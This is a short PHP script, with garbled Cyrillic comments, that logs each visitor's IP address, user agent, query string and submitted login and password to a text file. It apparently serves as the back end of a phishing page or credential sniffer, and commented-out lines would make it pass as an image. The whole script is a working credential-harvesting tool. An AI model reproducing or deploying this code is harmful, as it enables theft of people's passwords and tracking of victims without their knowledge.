<?
$file="file2.txt";
$data=date("d.m.Y H:i"); //� ������� �������� ������ ����������� ���� D - ���� ������, M - ����� Y - ���. 
//$time=date("h:i"); //� ������� �������� ������ ����������� ������� h - ����, i - ������ 
$ip=trim($_SERVER['REMOTE_ADDR']);   
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']);
$query=$_SERVER['QUERY_STRING'];
$login = $_POST[login];
$pass = $_POST[pass];
if(is_file($file)){ //��������� ������� ����� � ����������� ������ � ��� 
$fo=fopen($file,"a+"); //��������� ���� �� ������ � ����� 
$res="\n$data  |  $ip  |  $sysinfo | \n$query \n$login  | $pass \n"; //��������� ������ � ����������� �� ������ 
//� ������� ����|�����|ip-�����|�������������� ������� 
//Header("Content-type: image/png"); 
//$im = ImageCreateFromGif("jpg.jpg"); 
//ImageGif($im); 
//ImageDestroy($im); 
$fw=fwrite($fo,$res); //���������� � ���� 
fclose($fo); //��������� ���� 
} 
?>